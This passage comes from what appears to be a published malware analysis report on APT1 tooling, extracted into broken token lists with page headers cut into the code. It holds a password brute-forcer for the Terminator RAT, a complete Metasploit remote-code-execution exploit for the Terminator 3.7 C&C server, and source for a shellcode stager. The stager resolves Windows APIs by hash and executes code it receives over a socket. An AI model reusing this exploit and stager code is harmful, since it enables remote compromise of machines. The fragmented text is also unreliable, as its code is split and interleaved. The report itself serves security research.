"strlen(p", ")", ",", "(", "char*)out", ")", ";", "return", "out", ";", "}", "static", "void", "crypt_all(int", "count", ")", "{", "int", "index", "=", "0", ";", "#", "ifdef", "_", "OPENMP"], ["#", "pragma", "omp", "parallel", "for", "for", "(", "index", "=", "0", ";", "index", "<", "count", ";", "index++", ")"], ["#", "endif", "{", "CAMELLIA_KEY", "st_key", ";", "unsigned", "char", "in[16", "]", "=", "{", "0", "}", ";", "unsigned", "char", "key[32", "]", "=", "{", "0", "}", ";", "memcpy(key", ",", "saved_key[index", "]", ",", "strlen(saved_key[index", "]", ")", ")", ";", "Camellia_set_key(key", ",", "256", ",", "&", "st_key", ")", ";", "Camellia_encrypt(in", ",", "crypt_out[index", "]", ",", "&", "st_key", ")", ";", "}", "}", "static", "int", "cmp_all(void", "*", "binary", ",", "int", "count", ")", "{", "int", "index", "=", "0", ";", "#", "ifdef", "_", "OPENMP", "for", "(;", "index", "<", "count", ";", "index++", ")"], ["#", "endif", "if", "(", "!"], ["memcmp(binary", ",", "crypt_out[index", "]", ",", "BINARY_SIZE", ")", ")", "return", "1", ";", "return", "0", ";", "}", "static", "int", "cmp_one(void", "*", "binary", ",", "int", "index", ")", "{", "return", "!"], ["memcmp(binary", ",", "crypt_out[index", "]", ",", "BINARY_SIZE", ")", ";", "}", "static", "int", "cmp_exact(char", "*", "source", ",", "int", "index", ")", "{", "return", "1", ";", "}", "static", "void", "cam_set_key(char", "*", "key", ",", "int", "index", ")", "{", "int", "saved_key_length", "=", "strlen(key", ")", ";", "if", "(", "saved_key_length", ">", "PLAINTEXT_LENGTH", ")"], ["saved_key_length", "=", "PLAINTEXT_LENGTH", ";", "memcpy(saved_key[index", "]", ",", "key", ",", "saved_key_length", ")", ";", "saved_key[index][saved_key_length", "]", "=", "0", ";", "Ref", "."], ["RAP002_APT1_Technical_backstage.1.0"], ["Version", "1.0", "Page", "32", "of", "48", "Type", "Project"], ["Title", "Classification", "Public", "document"], ["APT1", ":", "technical", "backstage", "malware", "analysis"], ["Public", "}", "static", "char", "*", "get_key(int", "index", ")", "{", "return", "saved_key[index", "]", ";", "}", "struct", "fmt_main", "fmt_camellia", "=", "{", "{", "FORMAT_LABEL", ",", "FORMAT_NAME", ",", "ALGORITHM_NAME", ",", "BENCHMARK_COMMENT", ",", "BENCHMARK_LENGTH", ",", "PLAINTEXT_LENGTH", ",", "BINARY_SIZE", ","], ["#", "if", "FMT_MAIN_VERSION", ">", "9", "DEFAULT_ALIGN", ",", "#", "endif", "SALT_SIZE", ",", "#", "if", "FMT_MAIN_VERSION", ">", "9", "DEFAULT_ALIGN", ",", "#", "endif", "MIN_KEYS_PER_CRYPT", ",", "MAX_KEYS_PER_CRYPT", ",", "FMT_CASE", "|", "FMT_8_BIT", "|", "FMT_OMP", ",", "cam_tests", "}", ",", "{", "init", ",", "fmt_default_prepare", ",", "valid", ",", "fmt_default_split", ",", "get_binary", ",", "fmt_default_salt", ",", "#", "if", "FMT_MAIN_VERSION", ">", "9", "fmt_default_source", ",", "#", "endif", "{", "fmt_default_binary_hash", ",", "}", ",", "fmt_default_salt_hash", ",", "fmt_default_set_salt", ",", "cam_set_key", ",", "get_key", ",", "fmt_default_clear_keys", ",", "crypt_all", ",", "{", "fmt_default_get_hash", ",", "}", ",", "cmp_all", ",", "cmp_one", ",", "cmp_exact", "}", "}", ";", "Ref", "."], ["RAP002_APT1_Technical_backstage.1.0"], ["Version", "1.0", "Page", "33", "of", "48", "Type", "Project"], ["Title", "Classification", "Public", "document"], ["APT1", ":", "technical", "backstage", "malware", "analysis"], ["Public", "Terminator", "(", "aka", "Fakem", "RAT", ")", "password", "brute", "forcer", "//", "gcc", "-o", "bf", "bf.c", "//", "./bf"], ["10", "0xdafd58f3", "#", "include", "<", "stdio.h", ">", "#", "include", "<", "stdint.h", ">", "#", "include", "<", "string.h", ">"], ["#", "define", "ror(i", ",", "by", ")", "_", "_", "asm", "_", "_", "(", "\"", "ror", "%", "b1,%q0", "\"", ":", "\"", "+", "g", "\"", "(", "i", ")", ":", "\"", "Jc", "\"", "(", "by", ")", ")"], ["\\", "\\", "\\", "\\"], ["uint32_t", "crc32(char"], ["*", "data", ",", "int", "len", ")", "{", "uint32_t", "crc", "=", "0", ";", "int", "i", ";", "for", "(", "i", "=", "0", ";", "i", "<", "len", ";", "+", "+", "i", ")", "{", "crc", "|=", "data[i", "]", ";", "ror", "(", "crc", ",", "5", ")", ";", "}", "return", "crc", "^"], ["0x007A7871", ";", "}", "char", "MIN", "=", "'", "0", "'", ",", "MAX", "=", "'"], ["z", "'", ";", "int", "next", "(", "char", "*", "s", ",", "int", "len", ")", "{", "int", "i", ";", "for", "(", "i", "=", "0", ";", "i", "<", "len", ";", "+", "+", "i", ")", "{", "if", "(", "s[i", "]", "!"], ["=", "MAX", ")", "{", "+", "+", "s[i", "]", ";", "return", "i", ";", "}", "s[i", "]", "="], ["MIN", ";", "}", "return", "i", ";", "}", "int", "main(int", "argc", ",", "char", "*", "*", "argv", ")", "{", "int", "len", ";", "sscanf(argv[1", "]", ",", "\"", "%", "u", "\"", ",", "&", "len", ")", ";", "uint32_t", "crc", ";", "sscanf(argv[2", "]", ",", "\"", "%", "x", "\"", ",", "&", "crc", ")", ";", "int", "i", ";", "for", "(", "i", "=", "1", ";", "i", "<", "len", ";", "+", "+", "i", ")", "{", "char", "key[i", "+", "1", "]", ";", "memset", "(", "key", ",", "MIN", ",", "i", ")", ";", "key[i", "]", "=", "0", ";", "int", "current", "=", "i", "-", "1", ";", "while", "(", "next(key", ",", "i", ")", "!"], ["=", "i", ")", "{"], ["uint32_t", "_", "crc", "=", "crc32(key", ",", "i", ")", ";", "if", "(", "crc", "=", "=", "_", "crc", ")", "{"], ["printf(\"DEBUG:%s", "%", "x", "%", "x\\n", "\"", ",", "key", ",", "crc", ",", "_", "crc", ")", ";", "return", ";", "}", "}", "}", "}", "Ref", "."], ["RAP002_APT1_Technical_backstage.1.0"], ["Version", "1.0", "Page", "34", "of", "48", "Type", "Project"], ["Title", "Classification", "Public", "document"], ["APT1", ":", "technical", "backstage", "malware", "analysis"], ["Public", "Terminator", "(", "aka", "Fakem", "RAT", ")", "exploit", "require", "'", "msf", "/", "core", "'", "class", "Metasploit3", "<", "Msf::Exploit::Remote"], ["Rank", "=", "NormalRanking", "include", "Msf::Exploit::Remote::Tcp", "def", "initialize(info", "=", "{", "}", ")"], ["super(update_info(info", ",", "'", "Name", "'", "="], [">", "\"", "Terminator", "3.7", ",", "RCE", "\"", ",", "'", "Description", "'", "=", ">", "%", "q", "{"], ["This", "module", "exploits", "a", "stack", "buffer", "overflow", "in", "Terminator", "3.7", "C&C", "server", ".", "}", ",", "'", "License", "'", "="], [">", "MSF_LICENSE", ",", "'", "Author", "'", "="], [">"], ["[", "'", "Hugo", "Caron", "'", ",", "]", ",", "'", "References", "'", "=", ">"], ["[", "[", "'", "URL", "'", ",", "'", "http://www.malware.lu/", "'", "]", "]", ",", "'", "DisclosureDate", "'", "="], [">", "\"", "Mar", "XX", "2013", "\"", ",", "'", "DefaultOptions", "'", "=", ">", "{", "'", "EXITFUNC", "'", "=", ">", "'", "thread", "'", ",", "}", ",", "'", "Payload", "'", "="], [">", "{", "'", "StackAdjustment", "'", "=", ">", "-4000", ",", "'", "Space", "'", "=", ">", "512", ",", "'", "BadChars", "'", "="], [">", "\"", "\"", ",", "}", ",", "'", "Platform", "'", "=", ">", "'", "win", "'", ",", "'", "Targets", "'", "="], [">"], ["[", "[", "'", "Terminator", "3.7", "/", "Windows", "XP", "SP3", "'", ",", "{", "'", "Ret", "'", "=", ">", "0x0041AA97", ",", "'", "RWAddress", "'", "=", ">", "0x00401000", ",", "'", "Offset", "'", "=", ">", "0x806D", ",", "'", "PayloadOffset", "'", "=", ">", "0x75", ",", "'", "jmpPayload", "'", "=", ">", "\"", "\\x81\\xec\\x00\\x80\\x00\\x00\\xff\\xe4", "\"", "}", "]", "]", ",", "'", "DefaultTarget", "'", "=", ">", "0", ")", ")"], ["register_options", "(", "[", "Opt::RPORT(80", ")", ",", "]", ",", "self.class", ")"], ["register_advanced_options", "("], ["[", "Ref", "."], ["RAP002_APT1_Technical_backstage.1.0"], ["Version", "1.0", "Page", "35", "of", "48", "Type", "Project"], ["Title", "Classification", "Public", "document"], ["APT1", ":", "technical", "backstage", "malware", "analysis"], ["Public", "]", ",", "self.class", ")", "end", "def", "check", "return", "Exploit::CheckCode::Vulnerable"], ["#", "return", "Exploit::CheckCode::Safe", "end", "def", "ror(byte", ",", "count", ")", "while", "count", ">", "0", "do", "byte", "=", "(", "byte", ">", ">", "1", "|", "byte", "<", "<", "7", ")", "&", "0xFF", "count", "-=", "1", "end", "return", "byte", "end", "def", "encode(data", ")", "key", "=", "\"", "ARCHY\".reverse", "out", "=", "\"", "\"", "data.each_byte", "do", "|c|", "key.each_byte", "do", "|k|", "c", "^=", "k", "c", "=", "ror(c", ",", "3", ")"], ["end", "out", "<", "<", "c", "end", "return", "out", "end", "def", "exploit", "(", ")"], ["#", "Handshake", "connect", "print_status(\"Connection", "...", "\"", ")"], ["#", "ROP", "const", "sc_jmp_back", "=", "\"", "\\xe9\\x20\\xfc\\xff\\xff", "\"", "#", "-992", "push_esp", "="], ["[", "0x040675e].pack('V", "'", ")"], ["#", "Build", "ROP", "rop", "=", "''", "rop", "<", "<", "push_esp", "rop", "<", "<", "\"", "A", "\"", "*", "4", "rop", "<", "<", "sc_jmp_back", "#", "Build", "block", "to", "send", "block_size", "=", "0x400"], ["offset_block", "=", "128", "block", "=", "''", "block", "<", "<", "\"", "A", "\"", "*", "offset_block", "block", "<", "<", "rop", "block", "<", "<", "payload.encoded", "print_status(\"#{block_size", "}", "-", "#", "{", "block.length", "}", "\"", ")", "block", "<", "<", "\"", "B", "\"", "*", "(", "block_size", "-", "block.length", ")", "block", "=", "encode(block", ")"], ["content_len", "=", "0xc68", "header", "=", "\"", "POST", "/foo", "HTTP/1.0\\r\\nContent", "-", "Length", ":", "#", "{", "content_len}\\r\\n\\r\\n", "\"", "xploit", "=", "''", "xploit", "<", "<", "header", "xploit", "<", "<", "block", "print_status(\"Send", "exploit", "...", "\"", ")", "Ref", "."], ["RAP002_APT1_Technical_backstage.1.0"], ["Version", "1.0", "Page", "36", "of", "48", "Type", "Project"], ["Title", "Classification", "Public", "document"], ["APT1", ":", "technical", "backstage", "malware", "analysis"], ["Public", "sock.put(xploit", ")"], ["select(nil", ",", "nil", ",", "nil,5", ")", "disconnect", "end", "end", "Shellcode", "main.c", ":", "#", "include", "\"", "global.h", "\"", "#", "include", "\u201c", "winutils.h", "\u201d", "#", "define", "htons(n", ")", "(", "(", "(", "(", "(", "unsigned", "short)(n", ")", "&", "0xFF", ")", ")"], ["<", "<", "8)", "|", "(", "(", "(", "unsigned", "short)(n", ")", "&", "0xFF00", ")", ">", ">", "8)", ")", "int", "_", "main(int", "argc", ",", "char", "*", "argv"], ["[", "]", ")", "{", "HMODULE", "kernel32", ",", "ws32", ",", "msvcrt32", ",", "ntdll", ";", "WSADATA", "wsaData", ";", "sockaddr_in", "service", ";", "SOCKET", "sock", ",", "sockc", ";", "unsigned", "int", "len", ",", "i", ",", "cur_len=0", ";", "unsigned", "short", "port", "=", "htons(80", ")", ";", "int", "iResult", ";", "int", "(", "*", "sc", ")", "(", ")", ";", "s_config", "c", ";", "init_config(&c", ")", ";", "kernel32", "=", "get_kernel32", "(", ")", ";", "c.", "LoadLibraryA", "=", "(", "sLoadLibraryA)getprocaddrbyhash(kernel32", ",", "dLoadLibraryA", ")", ";", "c.", "VirtualAlloc", "="], ["(", "sVirtualAlloc)getprocaddrbyhash(kernel32", ",", "dVirtualAlloc", ")", ";", "ws32", "=", "c.", "LoadLibraryA(c.sws32", ")", ";", "c.socket", "=", "(", "ssocket)getprocaddrbyhash(ws32", ",", "dsocket", ")", ";", "c.closesocket", "=", "(", "sclosesocket)getprocaddrbyhash(ws32", ",", "dclosesocket", ")", ";", "c.getsockname", "=", "(", "sgetsockname)getprocaddrbyhash(ws32", ",", "dgetsockname", ")", ";", "c.recv", "=", "(", "srecv)getprocaddrbyhash(ws32", ",", "drecv", ")", ";"], ["c.listen", "=", "(", "slisten)getprocaddrbyhash(ws32", ",", "dlisten", ")", ";", "c.bind", "=", "(", "sbind)getprocaddrbyhash(ws32", ",", "dbind", ")", ";", "c.accept", "=", "(", "saccept)getprocaddrbyhash(ws32", ",", "daccept", ")", ";", "//for"], ["(", "i=0", ";", "i", "<", "65535", ";", "i++", ")", "{", "for", "(", "i=0", ";", "i", "<", "128000", ";", "i++", ")", "{", "struct", "sockaddr_in", "sin", ";", "socklen_t", "len", "=", "sizeof(sin", ")", ";", "if", "(", "c.getsockname(i", ",", "(", "struct", "sockaddr", "*", ")", "&", "sin", ",", "&", "len", ")", "!"], ["=", "-1", ")"], ["if", "(", "sin.sin_port", "!", "=", "htons(0", ")", ")"], ["if", "(", "sin.sin_addr.s_addr", "=", "=", "0x0", ")", "{", "port", "=", "sin.sin_port", ";", "c.closesocket(i", ")", ";", "}", "}", "Ref", "."], ["RAP002_APT1_Technical_backstage.1.0"], ["Version", "1.0", "Page", "37", "of", "48", "Type", "Project"], ["Title", "Classification", "Public", "document"], ["APT1", ":", "technical", "backstage", "malware", "analysis"], ["Public", "sock", "=", "c.socket(AF_INET", ",", "SOCK_STREAM", ",", "IPPROTO_TCP", ")", ";"], ["service.sin_family", "=", "AF_INET", ";", "service.sin_addr.s_addr", "=", "0", ";", "service.sin_port", "=", "port", ";", "if(c.bind(sock", ",", "(", "SOCKADDR", "*", ")", "&", "service", ",", "sizeof", "(", "service", ")", ")"], ["=", "=", "SOCKET_ERROR", ")", "{", "goto", "exit", ";", "}", "c.listen(sock", ",", "1", ")", ";", "sockc", "=", "c.accept(sock", ",", "NULL", ",", "NULL", ")", ";", "c.closesocket(sock", ")", ";", "iResult", "=", "c.recv(sockc", ",", "&", "len", ",", "sizeof(len", ")", ",", "0", ")", ";", "if(iResult", "!", "=", "sizeof(len", ")", ")", "{", "goto", "exit", ";", "}", "sc", "=", "c.", "VirtualAlloc(NULL", ",", "len", ",", "MEM_COMMIT", ",", "PAGE_EXECUTE_READWRITE", ")", ";", "cur_len", "=", "0", ";", "do", "{", "iResult", "=", "c.recv(sockc", ",", "sc+cur_len", ","], ["len", "-", "cur_len", ",", "0", ")", ";", "if(iResult", "=", "=", "0", ")", "{", "break", ";", "}", "else", "if(iResult", "<", "0", ")", "{", "goto", "exit", ";", "}", "cur_len", "+", "=", "iResult", ";", "}", "while(cur_len", "<", "len", ")", ";", "asm(\"movl", "%", "0", ",", "%", "%", "edi", ";", "\"", ":", ":", "\"", "r\"(sockc", ")", ":)", ";", "sc", "(", ")", ";", "exit", ":", "c.closesocket(sock", ")", ";", "return", "1", ";", "}", "global.h", ":", "#", "ifndef", "_", "_", "GLOBAL", "_", "_", "#", "define", "_", "_", "GLOBAL", "_", "_", "#", "include", "\"", "fct.h", "\"", "typedef", "struct", "{", "char", "sws32[12", "]", ";"], ["unsigned", "int", "sws32_len", ";", "sVirtualAlloc", "VirtualAlloc", ";", "sLoadLibraryA", "LoadLibraryA", ";", "sclosesocket", "closesocket", ";", "sgetsockname", "getsockname", ";", "srecv", "recv", ";", "sWSAStartup", "WSAStartup", ";", "ssocket", "socket", ";", "slisten", "listen", ";", "sbind", "bind", ";", "saccept", "accept", ";", "Ref", "."], ["RAP002_APT1_Technical_backstage.1.0"], ["Version", "1.0", "Page", "38", "of", "48", "Type", "Project"], ["Title", "Classification", "Public", "document"], ["APT1", ":", "technical", "backstage", "malware", "analysis"], ["Public", "}", "s_config", ";", "void", "init_config(s_config", "*", "config", ")", ";"], ["#", "endif", "fct.h", ":", "#", "ifndef", "_", "_", "FCT", "_", "_", "#", "define", "_", "_", "FCT", "_", "_", "#", "include", "<", "windows.h", ">"], ["#", "define", "_", "WIN32_WINNT", "0x0501", "#", "include", "<", "winsock2.h", ">", "#", "include", "<", "ws2tcpip.h", ">"], ["#", "define", "#", "define", "#", "define", "#", "define", "#", "define", "#", "define", "#", "define", "#", "define", "#", "define", "#", "define", "#", "define", "#", "define", "#", "define", "#", "define", "#", "define", "#", "define", "#", "define", "#", "define", "#", "define", "#", "define", "#", "define", "#", "define", "#", "define", "#", "define", "#", "define", "#", "define", "#", "define", "#", "define", "#", "define", "#", "define", "dLoadLibraryA", "0x9322f2db", "dMessageBoxA", "0x1c4e3f7a", "dmalloc", "0x0d9d6e2d", "dGetProcessHeap", "0x15a3e604"], ["dHeapAlloc", "0x50aa445e", "//", "RtlAllocateHeap"], ["dExpandEnvironmentStringsA", "0x85fc3b07", "dGetModuleFileNameA", "0x9fedfa45"], ["dCopyFileA", "0x6a4f8fa9"], ["dSetFileAttributesA", "0x1ce726cf"], ["dRegOpenKeyExA", "0xc1ab24e2", "dRegSetValueExA", "0xc0050eca"], ["dRegCloseKey", "0xa60bfc30", "dWSAStartup", "0xab5c89eb", "dgetaddrinfoA", "0x708fb562", "dsocket", "0x4ebb8f32", "dWSACleanup", "0xe25e6cc4"], ["dconnect", "0xda57c9f1", "dfreeaddrinfo", "0xbf712706"], ["drecv", "0x97c180f9"], ["dCreateThread", "0xc891017d", "dclosesocket", "0x53d900a4"], ["dWaitForSingleObject", "0x2cecf27a", "dVirtualFree", "0x1d3faf80", "dVirtualAlloc", "0xc143c5b9"], ["dSleep", "0x5b06c2b6", "dsend", "0x2fe09c83", "dgetsockname"], ["0x5adeac8e"], ["dbind", "0x480d35a8", "daccept", "0xd0f420d1", "dlisten", "0xc8da78c8", "typedef", "HMODULE", "(", "CALLBACK", "*", "sLoadLibraryA)(char", "*", ")", ";", "typedef", "void", "*", "(", "CALLBACK", "*", "smalloc)(size_t", "size", ")", ";", "typedef", "HANDLE", "(", "CALLBACK", "*", "sGetProcessHeap)(void", ")", ";", "typedef", "LPVOID", "(", "CALLBACK", "*", "sHeapAlloc", ")", "(", "HANDLE", "hHeap", ",", "DWORD", "dwFlags", ",", "SIZE_T", "dwBytes", ")", ";", "Ref", "."], ["RAP002_APT1_Technical_backstage.1.0"], ["Version", "1.0", "Page", "39", "of", "48", "Type", "Project"], ["Title", "Classification", "Public", "document"], ["APT1", ":", "technical", "backstage", "malware", "analysis"], ["Public", "typedef", "int", "(", "CALLBACK", "*", "sMessageBoxA)(HWND"], ["hWnd", ",", "char", "*", "lpText", ",", "char", "*", "lpCaption", ",", "UINT", "uType", ")", ";", "typedef", "DWORD", "(", "CALLBACK", "*", "sExpandEnvironmentStringsA", ")"], ["(", "LPCTSTR", "lpSrc", ",", "LPTSTR", "lpDst", ",", "DWORD", "nSize", ")", ";", "typedef", "DWORD", "(", "CALLBACK", "*", "sGetModuleFileNameA", ")", "(", "HMODULE", "hModule", ",", "LPTSTR", "lpFilename", ",", "DWORD", "nSize", ")", ";", "typedef", "BOOL", "(", "CALLBACK", "*", "sCopyFileA", ")", "(", "LPCTSTR", "lpExistingFileName", ",", "LPCTSTR", "lpNewFileName", ",", "BOOL", "bFailIfExists", ")", ";", "typedef", "BOOL", "(", "CALLBACK", "*", "sSetFileAttributesA", ")", "(", "LPCTSTR", "lpFileName", ",", "DWORD", "dwFileAttributes", ")", ";", "typedef", "LONG", "(", "CALLBACK", "*", "sRegOpenKeyExA", ")", "(", "HKEY", "hKey", ",", "LPCTSTR", "lpSubKey", ",", "DWORD", "ulOptions", ",", "REGSAM", "samDesired", ",", "PHKEY", "phkResult", ")", ";", "typedef", "LONG", "(", "CALLBACK", "*", "sRegSetValueExA", ")"], ["(", "HKEY", "hKey", ",", "LPCTSTR", "lpValueName", ",", "DWORD", "Reserved", ",", "DWORD", "dwType", ",", "const", "BYTE", "*", "lpData", ",", "DWORD", "cbData", ")", ";", "typedef", "LONG", "(", "CALLBACK", "*", "sRegCloseKey", ")", "(", "HKEY", "hKey", ")", ";", "typedef", "int", "(", "CALLBACK", "*", "sWSAStartup", ")", "(", "WORD", "wVersionRequested", ",", "LPWSADATA", "lpWSAData", ")", ";", "typedef", "int", "(", "CALLBACK", "*", "sgetaddrinfoA", ")", "(", "PCSTR", "pNodeName", ",", "PCSTR", "pServiceName", ",", "const", "struct", "addrinfo", "*", "pHints", ",", "struct", "addrinfo", "*", "*", "ppResult", ")", ";", "Ref", "."], ["RAP002_APT1_Technical_backstage.1.0"], ["Version", "1.0", "Page", "40", "of", "48", "Type", "Project"], ["Title", "Classification", "Public", "document"], ["APT1", ":", "technical", "backstage", "malware", "analysis"], ["Public", "typedef", "SOCKET", "(", "CALLBACK", "*", "ssocket", ")"], ["(", "int", "af", ",", "int", "type", ",", "int", "protocol", ")", ";"], ["typedef", "int", "(", "CALLBACK", "*", "sWSACleanup)(void", ")", ";", "typedef", "int", "(", "CALLBACK", "*", "sconnect", ")", "(", "SOCKET", "s", ",", "const", "struct", "sockaddr", "*", "name", ",", "int", "namelen", ")", ";", "typedef", "void", "(", "CALLBACK", "*", "sfreeaddrinfo", ")", "(", "struct", "addrinfo", "*", "ai", ")", ";", "typedef", "int", "(", "CALLBACK", "*", "srecv", ")", "(", "SOCKET", "s", ",", "char", "*", "buf", ",", "int", "len", ",", "int", "flags", ")", ";", "typedef", "HANDLE", "(", "CALLBACK", "*", "sCreateThread", ")", "(", "LPSECURITY_ATTRIBUTES", "lpThreadAttributes", ","], ["SIZE_T", "dwStackSize", ",", "LPTHREAD_START_ROUTINE", "lpStartAddress", ",", "LPVOID", "lpParameter", ",", "DWORD", "dwCreationFlags", ",", "LPDWORD", "lpThreadId", ")", ";", "typedef", "int", "_", "_", "stdcall", "(", "CALLBACK", "*", "sclosesocket", ")", "("], ["SOCKET", "s", ")", ";", "typedef", "DWORD", "(", "CALLBACK", "*", "sWaitForSingleObject", ")", "(", "HANDLE", "hHandle", ",", "DWORD", "dwMilliseconds", ")", ";", "typedef", "BOOL", "(", "CALLBACK", "*"], ["LPVOID", "lpAddress", ",", "SIZE_T", "dwSize", ",", "DWORD", "dwFreeType", ")", ";", "sVirtualFree", ")", "(", "typedef", "LPVOID", "(", "CALLBACK", "*", "sVirtualAlloc", ")", "(", "LPVOID", "lpAddress", ",", "SIZE_T", "dwSize", ",", "DWORD", "flAllocationType", ",", "DWORD", "flProtect", ")", ";", "typedef", "VOID", "(", "CALLBACK", "*", "sSleep", ")", "(", "DWORD", "dwMilliseconds", ")", ";", "Ref", "."], ["RAP002_APT1_Technical_backstage.1.0"], ["Version", "1.0", "Page", "41", "of", "48", "Type", "Project"], ["Title", "Classification", "Public", "document"], ["APT1", ":", "technical", "backstage", "malware", "analysis"], ["Public", "typedef", "int", "(", "CALLBACK", "*", "ssend", ")", "(", "SOCKET", "s", ",", "const", "char", "*", "buf", ",", "int", "len", ",", "int", "flags", ")", ";", "typedef", "int", "_", "_", "stdcall", "(", "CALLBACK", "*", "sgetsockname", ")"], ["(", "SOCKET", "s", ",", "struct", "sockaddr", "*", "name", ",", "int", "*", "namelen", ")", ";", "typedef", "int", "(", "CALLBACK", "*", "slisten", ")", "("], ["SOCKET", "s", ",", "int", "backlog", ")", ";", "typedef", "SOCKET", "(", "CALLBACK", "*", "saccept", ")"], ["(", "SOCKET", "s", ",", "struct", "sockaddr", "*", "addr", ","], ["int", "*", "addrlen", ")", ";", "typedef", "int", "(", "CALLBACK", "*", "sbind", ")", "(", "SOCKET", "s", ",", "const", "struct", "sockaddr", "*", "name", ",", "int", "namelen", ")", ";", "//", "MSF", "init", "RelfctiveDllInjection", "typedef", "int", "(", "CALLBACK", "*", "sInit", ")", "(", "SOCKET", "s", ")", ";", "typedef", "struct", "{", "short", "sin_family", ";", "u_short", "sin_port", ";", "struct", "in_addr", "sin_addr", ";", "char", "sin_zero[8", "]", ";", "}", "sockaddr_in", ";", "#", "endif", "winutils.h", ":", "#", "ifndef", "_", "_", "WINUTILS", "_", "_", "#", "define", "_", "_", "WINUTILS", "_", "_", "#", "include", "\"", "hashlib.h", "\"", "HMODULE", "get_kernel32(void", ")", ";", "void", "*", "getprocaddr(HMODULE", "module", ",", "char", "*", "func_name", ")", ";", "void", "*", "getprocaddrbyhash(HMODULE", "module", ",", "unsigned", "int", "hash", ")", ";", "int", "strcmp(char", "*", ",", "char", "*", ")", ";", "int", "strlen(char", "*", ")", ";", "#", "endif", "hashlib.h", ":", "Ref", "."], ["RAP002_APT1_Technical_backstage.1.0"], ["Version", "1.0", "Page", "42", "of", "48", "Type", "Project"], ["Title", "Classification", "Public", "document"], ["APT1", ":", "technical", "backstage", "malware", "analysis"], ["Public", "#", "ifndef", "_", "_", "HASHLIB", "_", "_", "#", "define", "_", "_", "HASHLIB", "_", "_", "unsigned", "int", "FNV1HashStr(char", "*", "buffer", ")", ";", "#", "endif", "gethash.c", ":", "#", "include", "<", "stdio.h", ">", "#", "include", "\"", "hashlib.h", "\"", "int", "main(int", "argc", ",", "char", "*", "argv", "[", "]", ")", "{", "unsigned", "int", "hash", "=", "0", ";", "if", "(", "argc", "!", "=", "2", ")", "{", "fprintf(stderr", ",", "\"", "%", "s", "string\\n", "\"", ",", "argv[0", "]", ")", ";", "return", "1", ";", "}", "hash", "=", "FNV1HashStr(argv[1", "]", ")", ";", "printf(\"0x%08x\\n", "\"", ",", "hash", ")", ";", "return", "0", ";", "}"], ["hash.asm", ":", "section", ".text", "%", "define", "buffer", "[", "ebp+8", "]", "%", "define", "offset_basis", "2166136261", ";", "http://forum.nasm.us/index.php?topic=874.0", "global", "FNV1HashStr", "FNV1HashStr", ":", "push", "ebp", "mov", "ebp", ",", "esp", "push", "esi", "push", "edi", "push", "ebx", "push", "ecx", "push", "edx", "mov", "esi", ",", "buffer", "mov", "eax", ",", "offset_basis", "mov", "edi", ",", "1000193h"], ["xor", "ebx", ",", "ebx", "nextbyte", ":"], ["mul", "edi", "mov", "bl", ",", "[", "esi", "]", "xor", "eax", ",", "ebx", "inc", "esi", "cmp", "byte", "[", "esi", "]", ",", "0"], ["jnz", "nextbyte", "Ref", "."], ["RAP002_APT1_Technical_backstage.1.0", ";", "set", "up", "stack", "frame", ";", "save", "registers", "used", ";", "esi", "=", "ptr", "to", "buffer", ";", "set", "to", "2166136261", "for", "FNV-1", ";", "FNV_32_PRIME", "=", "16777619", ";", "ebx", "=", "0", ";", "eax", "=", "eax", "*", "FNV_32_PRIME", ";", "bl", "=", "byte", "from", "esi", ";"], ["al", "=", "al", "xor", "bl", ";", "esi", "=", "esi", "+", "1", "(", "buffer", "pos", ")", ";", "if", "ecx", "!"], ["=", "0", ",", "jmp", "to", "NextByte", "Version", "1.0", "Page", "43", "of"], ["48", "Type", "Project"], ["Title", "Classification", "pop", "pop", "pop", "pop", "pop", "mov", "pop", "ret", "edx", "ecx", "ebx", "edi", "esi", "esp", ",", "ebp", "ebp", "Public", "document"], ["APT1", ":", "technical", "backstage", "malware", "analysis"], ["Public", ";", "restore", "registers", ";", "restore", "stack", "frame", ";", "eax", "=", "fnv1", "hash", "winutils.asm", ":", "section", ".text", "global", "get_kernel32", "global", "getprocaddr", "global", "getprocaddrbyhash", "global", "strcmp", "global", "strlen", "extern", "FNV1HashStr", "get_kernel32", ":", "push", "ebp", "mov", "ebp", ",", "esp", "mov", "ecx", ",", "[", "fs", ":", "0x30", "]", ";", "pointer", "to", "PEB", "mov", "ecx", ",", "[", "ecx", "+", "0xc", "]", ";", "get", "PEB->Ldr", "mov", "ecx", ",", "[", "ecx", "+", "0x14", "]", ";", "get", "PEB->Ldr", "."], ["InMemoryOrderModuleList", "."], ["Flink", "(", "1st", "entry", ")"], ["next_module", ":"], ["mov", "ecx", ",", "[", "ecx", "]", ";", "2nd", "Entry", ",", "start", "check", "at", "second", "entry", "1st", "is", "main", "module", "mov", "esi", ",", "[", "ecx", "+", "0x28", "]", ";", "get", "module", "name", "cmp", "word", "[", "esi", "+", "12", "*", "2", "]", ",", "0", ";", "check", "len", "12", "for", "kernel32", "jne", "next_module", "mov", "eax", ","], ["[", "ecx", "+", "0x10", "]", "cmp", "word", "[", "eax", "]", ",", "'", "MZ", "'"], ["je"], ["get_kernel32_end", "xor", "eax", ",", "eax", ";", "Get", "Kernel32", "Base", ";", "check", "for", "MZ", "get_kernel32_end", ":", "mov", "esp", ",", "ebp", "pop", "ebp", "ret", "getprocaddrbyhash", ":", "push", "ebp", "mov", "ebp", ",", "esp", "sub", "esp", ",", "12", ";", "3", "DWORD", "push", "ebx", ";", "verify", "MZ", "and", "PE", "headers", "mov", "ebx", ",", "[", "ebp", "+", "0x08", "]", ";", "get", "arg1", "cmp", "word", "[", "ebx", "]", ",", "'", "MZ", "'", "jne", "getprocaddrbyhash_failed", ";", "check", "for", "MZ", "add", "ebx", ",", "[", "ebx", "+", "0x3C", "]", "Ref", "."], ["RAP002_APT1_Technical_backstage.1.0"], ["Version", "1.0", "Page", "44", "of", "48", "Type", "Project"], ["Title", "Classification", "Public", "document"], ["APT1", ":", "technical", "backstage", "malware", "analysis"], ["Public", ";", "cmp", "word", "[", "ebx", "]", ",", "'", "PE", "'", ";", "jne", "getprocaddrbyhash_failed", ";", "check", "for", "PE", "mov", "[", "ebp", "-", "0x0C", "]", ",", "edx", ";", "save", "the", "PE", "header", ";", "find", "the", "real", "addr", "of", "the", "EAT", "mov", "eax", ",", "[", "ebx", "+", "0x78", "]", ";", "OptionalHeader", "."], ["DataDirectory[0].VirtualAddress", "add", "eax", ",", "dword", "[", "ebp", "+", "0x08", "]", ";", "add", "the", "offset", "to", "the", "base", "address", "mov"], ["[", "ebp", "-", "0x08", "]", ",", "eax", ";", "save", "it", "!", ";", "find", "the", "real", "address", "of", "export", "names", "mov", "eax", ","], ["[", "eax", "+", "0x20", "]", ";", "eax", "is", "still", "addr", "of", "EAT", "(", "0x20", 